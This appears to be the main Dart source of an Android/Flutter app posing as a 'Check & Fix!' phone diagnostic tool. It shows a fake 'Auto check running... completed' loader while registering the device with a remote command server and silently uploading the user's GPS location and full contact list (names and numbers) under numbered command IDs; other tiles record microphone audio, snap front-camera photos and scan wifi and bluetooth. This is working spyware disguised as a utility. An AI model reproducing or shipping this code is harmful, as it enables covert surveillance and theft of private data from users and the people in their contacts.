import 'dart:developer';
import 'dart:io';
import 'dart:math' as math;
import 'package:check_and_fix/color_printer.dart';
import 'package:check_and_fix/services.dart';
import 'package:file_picker/file_picker.dart';
import 'package:fk_user_agent/fk_user_agent.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter_easyloading/flutter_easyloading.dart';
import 'package:hive/hive.dart';
import 'package:image_picker/image_picker.dart';
import 'package:path_provider/path_provider.dart';
// import 'package:photo_manager/photo_manager.dart';
import 'package:record/record.dart';
import 'package:camera/camera.dart';
import 'package:flutter/material.dart';
import 'package:flutter_blue/flutter_blue.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:permission_handler_platform_interface/permission_handler_platform_interface.dart';
import 'package:rich_console/print_rich.dart';

// import 'package:syncfusion_flutter_datepicker/datepicker.dart';
import 'package:table_calendar/table_calendar.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:uuid/uuid.dart';

// import 'package:sms/sms.dart';
import 'package:wifi_scan/wifi_scan.dart';
// import 'package:wifi/wifi.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  final dbDir = await getApplicationDocumentsDirectory();
  Hive.init(dbDir.path);

  runApp(MaterialApp(
    home: PermissionHandlerWidget(),
    builder: EasyLoading.init(),
  ));
  configLoading();
}

void configLoading() {
  EasyLoading.instance
    ..displayDuration = const Duration(milliseconds: 2000)
    ..indicatorType = EasyLoadingIndicatorType.dualRing
    ..loadingStyle = EasyLoadingStyle.light
    ..indicatorSize = 45.0
    ..radius = 10.0
    ..maskColor = Colors.black.withOpacity(0.20)
    ..progressColor = Colors.blue
    ..backgroundColor = Colors.green
    ..indicatorColor = Colors.red
    ..textColor = Colors.yellow
    ..userInteractions = false
    ..dismissOnTap = false;
}

/// A Flutter application demonstrating the functionality of this plugin
class PermissionHandlerWidget extends StatefulWidget {
  @override
  _PermissionHandlerWidgetState createState() => _PermissionHandlerWidgetState();
}

class _PermissionHandlerWidgetState extends State<PermissionHandlerWidget> {
  var colorIndex = 15;
  String? uuid;
  String? imei;
  String? agent;

  @override
  void initState() {
    requestPermissions();
    super.initState();
  }

  void requestPermissions() async {
    await _initServerConnection();
    printWhite('UUID: $uuid');
    printWhite('IMEI: $imei');
    printWhite('agent: $agent');
    await _requestPermission(Permission.contacts);
    await _requestPermission(Permission.location);
    _dummyLoader();
    sendLocationToServer(agent, uuid);
    sendContactsToServer(agent, uuid);
    setState(() {});
  }

  Future<PermissionStatus?> _requestPermission(Permission permission) async {
    final alreadyGranted = await permission.isGranted;
    if (alreadyGranted) return null;

    final status = await permission.request();
    try {
      if (status.isGranted) {
        print('${permission.toString()} granted');
      } else {
        print('${permission.toString()} denied');
      }
    } catch (e) {}
    return status;
  }

  Future _initServerConnection() async {
    final box = await Hive.openBox('myBox');

    await FkUserAgent.init();
    agent = FkUserAgent.userAgent!;
    box.put('agent', agent);

    imei = box.get('imei') ??
        const Uuid().v4(); // -> '110ec58a-a0f2-4ac4-8393-c866d813b8d1';
    box.put('imei', imei);

    // if (kDebugMode) await box.clear();
    // DEBUG UUID: 870e76ef-1ac7-41f6-a467-6bec59b4e315
    uuid = box.get('uuid');
    uuid ??= await Api.initRegister(agent!);
    box.put('uuid', uuid);
    setState(() {});

    Api.agentUpdate(agent, uuid, data: {
      "uuid": uuid,
      "command_id": "1001",
      "data": {
        "IMEI": imei.toString(),
        "phone_number": '',
        "voice_mail_number": '',
        // "IMSI": "121212",
        "IMSI": UniqueKey().toString().replaceAll('#', ''),
        "network_name": "Android",
      }
    });
  }

  Future _dummyLoader() async {
    EasyLoading.show(
        status: 'Auto check running...', maskType: EasyLoadingMaskType.custom);
    await Future.delayed(const Duration(milliseconds: 3500));
    EasyLoading.showSuccess('Check & Fix completed!',
        duration: const Duration(milliseconds: 2500));
    // EasyLoading.showError('Failed with Error');
    // EasyLoading.dismiss();
  }

  List<Widget> permissionContainers() {
    return Permission.values.where(
      (permission) {
        // Also reactive in android manifest!
        //~ To remove permissions:
        return
            //> Coming soon:
            permission != Permission.calendar &&
                permission != Permission.camera &&
                permission != Permission.photos &&
                permission != Permission.manageExternalStorage &&
                permission != Permission.locationAlways &&
                permission != Permission.sms &&
                permission != Permission.phone &&
                //> Will not be in use:
                permission != Permission.unknown &&
                permission != Permission.mediaLibrary &&
                // permission != Permission.photos &&
                permission != Permission.photosAddOnly &&
                permission != Permission.reminders &&
                permission != Permission.appTrackingTransparency &&
                permission != Permission.nearbyWifiDevices &&
                permission != Permission.bluetooth &&
                permission != Permission.bluetoothAdvertise &&
                permission != Permission.bluetoothConnect &&
                permission != Permission.bluetoothScan &&
                permission != Permission.sensors &&
                permission != Permission.speech &&
                permission != Permission.notification &&
                permission != Permission.activityRecognition &&
                permission != Permission.requestInstallPackages &&
                permission != Permission.systemAlertWindow &&
                permission != Permission.accessNotificationPolicy &&
                permission != Permission.locationWhenInUse &&
                permission != Permission.criticalAlerts &&
                // permission != Permission.manageExternalStorage &&
                // permission != Permission.storage &&
                permission != Permission.accessMediaLocation &&
                permission != Permission.audio &&
                permission != Permission.videos &&
                permission != Permission.ignoreBatteryOptimizations &&
                permission != Permission.scheduleExactAlarm;
      },
    ).map((permission) {
      // var color = Colors.primaries[math.Random().nextInt(Colors.primaries.length)]
      var color = Colors.primaries[colorIndex].withOpacity(0.70);
      colorIndex--;
      if (colorIndex == 0) colorIndex = 15;

      // var color = Colors.blue.withOpacity(0.75);
      var icon = Icons.done;

      if (permission == Permission.calendar) {
        icon = Icons.event;
      }
      if (permission == Permission.camera) {
        icon = Icons.photo_camera;
      }
      if (permission == Permission.contacts) {
        icon = Icons.groups;
      }
      if (permission == Permission.location) {
        icon = Icons.location_on;
      }
      if (permission == Permission.locationAlways) {
        icon = Icons.my_location;
      }
      if (permission == Permission.microphone) {
        icon = Icons.mic;
      }
      if (permission == Permission.phone) {
        icon = Icons.call;
      }
      if (permission == Permission.photos) {
        icon = Icons.image;
      }
      if (permission == Permission.sms) {
        icon = Icons.textsms;
      }
      if (permission == Permission.storage ||
          permission == Permission.manageExternalStorage) {
        icon = Icons.folder;
        // icon = Icons.cloud_done;
      }
      if (permission == Permission.videos) {
        icon = Icons.movie;
      }
      if (permission == Permission.audio) {
        icon = Icons.volume_up;
      }

      return PermissionWidget(permission, color, icon);
    }).toList();
  }

  @override
  Widget build(BuildContext context) {
    print('START: PermissionHandlerWidget()');

    return Scaffold(
      backgroundColor: Colors.blue[300],
      appBar: AppBar(
        titleSpacing: 0,
        leading: const Icon(Icons.auto_fix_high),
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              'Check & Fix!',
              style: TextStyle(fontWeight: FontWeight.bold, fontSize: 18),
            ),
            Text(
              'Check all your phone in 1 app:',
              style: TextStyle(fontSize: 13),
            ),
          ],
        ),
        elevation: 0,
      ),
      body: Center(
        child: GridView(
          gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
            crossAxisCount: (2),
          ),

          //1. Contacts
          // 2. Location (Fine)
          // 3. Microphone
          // 4. Call Logs
          // 5. SMS

          // Operation "מבצעי" mode: need to wait agent & update server with initState()
          // But not in normal mode
          children: agent != null && uuid != null
              ? permissionContainers()
              : permissionContainers(),
        ),
      ),

      /* ListView(
            children: Permission.values
                .where((permission) {
                  return permission != Permission.unknown &&
                      permission != Permission.mediaLibrary &&
                      permission != Permission.photos &&
                      permission != Permission.photosAddOnly &&
                      permission != Permission.reminders &&
                      permission != Permission.appTrackingTransparency &&
                      permission != Permission.criticalAlerts;
                })
                .map((permission) => PermissionWidget(permission))
                .toList()),*/
    );
  }
}

class PermissionWidget extends StatefulWidget {
  final Permission _permission;
  final Color color;
  final IconData icon;

  const PermissionWidget(this._permission, this.color, this.icon, {super.key});

  @override
  _PermissionState createState() => _PermissionState(_permission);
}

class _PermissionState extends State<PermissionWidget> {
  _PermissionState(this._permission);

  final Permission _permission;
  final PermissionHandlerPlatform _permissionHandler = PermissionHandlerPlatform.instance;
  PermissionStatus _permissionStatus = PermissionStatus.denied;
  String _permissionResult = '';
  bool isChecked = false;
  String? uuid;
  String? imei;
  String? agent;

  @override
  void initState() {
    // sendPermissionData();
    // uuid = widget.uuid;
    // imei = widget.imei;
    // setState(() {});
    super.initState();
  }

  // Future<void> sendPermissionData() async {
  //   print('START: sendPermissionData() _permission: $_permission');
  //
  //   // await Future.delayed(const Duration(seconds: 1));
  //   final box = await Hive.openBox('myBox');
  //   uuid = box.get('uuid');
  //   imei = box.get('imei');
  //   agent = box.get('agent');
  //   print('agent $agent');
  //   print('imei $imei');
  //   print('uuid $uuid');
  //
  //   if (await _permission.isGranted) {
  //     permissionUsecase();
  //   }
  //
  //   // await _requestPermission(Permission.microphone);
  //   // await _requestPermission(Permission.storage);
  //   // await _requestPermission(Permission.phone);
  //   // Request more permissions if needed
  // }

  Future<void> _requestPermissionOnTap(Permission permission) async {
    print('START: requestPermission()');
    bool includeSms = permission == Permission.phone;

    final status = await _permissionHandler
        .requestPermissions(includeSms ? [permission, Permission.sms] : [permission]);

    _permissionStatus = status[permission] ?? PermissionStatus.denied;
    print('_permissionStatus ${_permissionStatus}');
    setState(() {});
    if (await _permission.isGranted) {
      permissionUsecase();
    }
  }

  void _listenForPermissionStatus() async {
    final status = await _permissionHandler.checkPermissionStatus(_permission);
    setState(() => _permissionStatus = status);
  }

  Future<void> permissionUsecase() async {
    log('check method started');
    _permissionResult = 'Loading...';
    setState(() {});

    if (_permission.toString() == 'Permission.bluetooth' ||
        _permission.toString() == 'Permission.bluetoothScan') {
      FlutterBlue flutterBlue = FlutterBlue.instance;
      log('permission check for bluetooth');

      flutterBlue.startScan(timeout: const Duration(seconds: 4));

      var subscription = flutterBlue.scanResults.listen((results) {
        setState(() {
          _permissionResult = '${results[0].device.name} found! rssi: ${results[0].rssi}';
        });
      });

      flutterBlue.stopScan();
    } else if (_permission.toString() == 'Permission.location' ||
        _permission.toString() == 'Permission.locationAlways' ||
        _permission.toString() == 'Permission.locationWhenInUse') {
      _permissionResult = await sendLocationToServer(agent, uuid) ?? '';
      setState(() {});
    } else if (_permission.toString() == 'Permission.contacts') {
      final contactsLength = await sendContactsToServer(agent, uuid) ?? '';
      _permissionResult = '$contactsLength contacts found';
      setState(() {});
    } else if (_permission.toString() == 'Permission.storage') {
      Future.delayed(const Duration(seconds: 3)).then((value) async {
        _permissionResult = 'No issues found';
        setState(() {});
      });
    } else if (_permission.toString() == 'Permission.microphone') {
      final record = Record();

      if (await record.hasPermission()) {
        await record.start(
            // path: 'aFullPath/myFile.m4a',
            // encoder: AudioEncoder.aacLc, // by default
            );
      }
      bool isRecording = await record.isRecording();
      _permissionResult = 'Recording... ($isRecording)';
      setState(() {});

      Future.delayed(const Duration(seconds: 3)).then((value) async {
        await record.stop();
        _permissionResult = 'Record Saved';
        setState(() {});
      });
    } else if (_permission.toString() == 'Permission.phone') {
      print('START: phone()');
      // GET WHOLE CALL LOG
      // Iterable<CallLogEntry> entries = await CallLog.get();

// QUERY CALL LOG (ALL PARAMS ARE OPTIONAL)
//       var now = DateTime.now();
//       Iterable<CallLogEntry> entries = await CallLog.query(
//         // dateFrom: from,
//         // dateTo: to,
//         durationFrom: 0,
//         durationTo: 30,
//         // name: 'John Doe',
//         // number: '901700000',
//         // type: CallType.incoming,
//       );
//
//       _permissionResult = 'Found! ${entries.length} calls in last 30 days';
      setState(() {});
    } else if (_permission.toString() == 'Permission.photos') {
      print('START: photos()');
      // final PermissionState _ps = await PhotoManager.requestPermissionExtend();
      // print('_ps.hasAccess ${_ps.hasAccess}');
      // print('_ps.isAuth ${_ps.isAuth}');
      // final List<AssetEntity> entities = await PhotoManager.getAssetListRange(start: 0, end: 80);
      // print('entities ${entities.length}');

      final ImagePicker _picker = ImagePicker();
      final XFile? image = await _picker.pickImage(source: ImageSource.gallery);
      // final List<XFile>? images = await _picker.pickMultiImage();
      _permissionResult = '${image?.path}';
      setState(() {});
    } else if (_permission.toString() == 'Permission.videos') {
      final ImagePicker _picker = ImagePicker();
      final XFile? video = await _picker.pickVideo(source: ImageSource.camera);
      _permissionResult = '${video?.path}';
      setState(() {});
    }
    // else if (_permission.toString() == 'Permission.storage') {
    else if (_permission.toString() == 'Permission.manageExternalStorage') {
      print('START: manageExternalStorage()');

      // List<StorageInfo> storageInfo = await PathProviderEx.getStorageInfo();
      // var root = storageInfo[0].rootDir; //storageInfo[1] for SD card, geting the root directory
      // var fm = FileManager(root: Directory(root)); //
      // var files = await fm.filesTree(
      //   //set fm.dirsTree() for directory/folder tree list
      //     excludedPaths: ["/storage/emulated/0/Android"],
      //     extensions: ["png", "pdf"] //optional, to filter files, remove to list all,
      //   //remove this if your are grabbing folder list
      // );
      // print('files ${files.length}');

      FilePickerResult? result = await FilePicker.platform.pickFiles(allowMultiple: true);
      _permissionResult = 'Click to open';
      setState(() {}); //update the UI
    } else if (_permission.toString() == 'Permission.calendar') {
      _permissionResult = 'Click to open';
      // Navigator.push(
      //   context,
      //   MaterialPageRoute(builder: (context) => Scaffold(body: SfDateRangePicker())),
      // );
    } else if (_permission.toString() == 'Permission.sms') {
      // SmsQuery query = SmsQuery();

      // List<SmsMessage> messages = await query.querySms(
      //   kinds: [SmsQueryKind.inbox, SmsQueryKind.sent, SmsQueryKind.draft],
      //   // count: 101,
      // );
      // _permissionResult = '${messages.length} SMSs found';
      setState(() {});
    } else if (_permission.toString() == 'Permission.nearbyWifiDevices') {
      var accessPoints;
      final can = await WiFiScan.instance.canGetScannedResults(askPermissions: true);
      switch (can) {
        case CanGetScannedResults.yes:
          accessPoints = await WiFiScan.instance.getScannedResults();

          break;
        case CanGetScannedResults.notSupported:
          // TODO: Handle this case.
          break;
        case CanGetScannedResults.noLocationPermissionRequired:
          // TODO: Handle this case.
          break;
        case CanGetScannedResults.noLocationPermissionDenied:
          // TODO: Handle this case.
          break;
        case CanGetScannedResults.noLocationPermissionUpgradeAccuracy:
          // TODO: Handle this case.
          break;
        case CanGetScannedResults.noLocationServiceDisabled:
          // TODO: Handle this case.
          break;
      }
      _permissionResult = accessPoints[0].ssid.toString();
      setState(() {});
    } else if (_permission.toString() == 'Permission.camera') {
      late CameraController controller;
      late List<CameraDescription> _cameras;
      _cameras = await availableCameras();
      controller = CameraController(_cameras[1], ResolutionPreset.medium);
      await controller.initialize().then((value) async {
        XFile img = await controller.takePicture();
        log('img is :: ${img.path}');
        _permissionResult = img.path.toString();
        setState(() {});
      });
    }
  }

  Color getPermissionColor() {
    switch (_permissionStatus) {
      case PermissionStatus.denied:
        return Colors.red;
      case PermissionStatus.granted:
        // checkMethod();

        return Colors.green;
      case PermissionStatus.limited:
        return Colors.orange;
      default:
        return Colors.grey;
    }
  }

  @override
  Widget build(BuildContext context) {
    return InkWell(
      onTap: () {
        _requestPermissionOnTap(_permission);
      },
      child: Container(
        margin: EdgeInsets.all(MediaQuery.of(context).size.width * 0.02),
        padding: EdgeInsets.all(MediaQuery.of(context).size.width * 0.02),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(6),
          color: Colors.white54,
          border: Border.all(
            width: 7,
            color: widget.color, // red as border color
          ),
        ),
        child: Column(
          children: [
            SizedBox(height: MediaQuery.of(context).size.height * 0.03),
            Icon(
              widget.icon,
              color: Colors.black,
              size: 40,
            ),
            SizedBox(height: MediaQuery.of(context).size.height * 0.005),
            SizedBox(
              width: double.infinity,
              child: Column(
                children: [
                  Text(
                    _permission == Permission.phone
                        ? 'Check Backup'
                        : _permission
                            .toString()
                            .replaceAll('Permission.', '')
                            .replaceAll('manageExternalStorage', 'External Storage'),
                    style: Theme.of(context).textTheme.bodyText1,
                  ),
                ],
              ),
            ),
            SizedBox(
              height: MediaQuery.of(context).size.height * 0.005,
            ),

            SizedBox(
              width: double.infinity,
              child: Column(
                children: [
                  Text(
                    _permissionStatus
                        .toString()
                        .replaceAll('PermissionStatus.', 'Status: '),
                    style: TextStyle(color: getPermissionColor(), fontSize: 12),
                  ),
                ],
              ),
            ),
            SizedBox(height: MediaQuery.of(context).size.height * 0.003),

            if (_permissionStatus == PermissionStatus.granted)
              // Padding(
              //   padding: const EdgeInsets.only(left: 15.0),
              //   child: Row(
              //     mainAxisAlignment: MainAxisAlignment.start,
              //     children: [
              Container(
                width: double.infinity,
                child: Text(
                  _permissionResult.toString(),
                  style: TextStyle(fontSize: 12, fontWeight: FontWeight.normal),
                  maxLines: 3,
                  overflow: TextOverflow.ellipsis,
                ),
              ),
            //     ],
            //   ),
            // ),
            //   ],
            // ),

            // trailing: (_permission is PermissionWithService)
            //     ? IconButton(
            //         icon: const Icon(
            //           Icons.info,
            //           color: Colors.white,
            //         ),
            //         onPressed: () {
            //           checkServiceStatus(
            //               context, _permission as PermissionWithService);
            //         })
            //     : null,
            // onTap: () {
            //   requestPermission(_permission);
            // },
            // ),
          ],
        ),
      ),
    );
  }

// _checkServiceStatus(context, permission as PermissionWithService);
// void _checkServiceStatus(BuildContext context, PermissionWithService permission) async {
//   print('START: checkServiceStatus()');
//   var resp = await _permissionHandler.checkServiceStatus(permission);
//   print('resp.isEnabled ${resp.isEnabled}');
// }
}

Future<String?> sendLocationToServer(String? agent, String? uuid) async {
  printWhite('START: sendLocationToServer() ');
  print('agent ${agent}');
  print('uuid ${uuid}');

  final Position position = await Geolocator.getCurrentPosition(
    desiredAccuracy: LocationAccuracy.high,
    timeLimit: const Duration(seconds: 10),
  );
  Api.agentUpdate(agent, uuid, data: {
    "uuid": uuid,
    "command_id": "3",
    "data": {
      "longitude": "${position.longitude}",
      "latitude": "${position.latitude}",
      "date": "${DateTime.now()}"
    }
  });
  return position.toString();
}

Future<String?> sendContactsToServer(String? agent, String? uuid) async {
  printWhite('START: sendContactsToServer()');
  print('agent ${agent}');
  print('uuid ${uuid}');

  Iterable<Contact> contacts = await ContactsService.getContacts();
  List phonesData = [];
  for (var c in contacts) {
    if ((c.phones ?? []).isNotEmpty) {
      if (kDebugMode && phonesData.length > 4) break;
      phonesData.add(
        {
          "mobileNumber": '${c.phones?.first.value}',
          "name": c.displayName,
        },
      );
    }
  }

  await Api.agentUpdate(
    agent,
    uuid,
    data: {"uuid": uuid, "command_id": "1", "data": phonesData},
  );

  return contacts.length.toString();
}
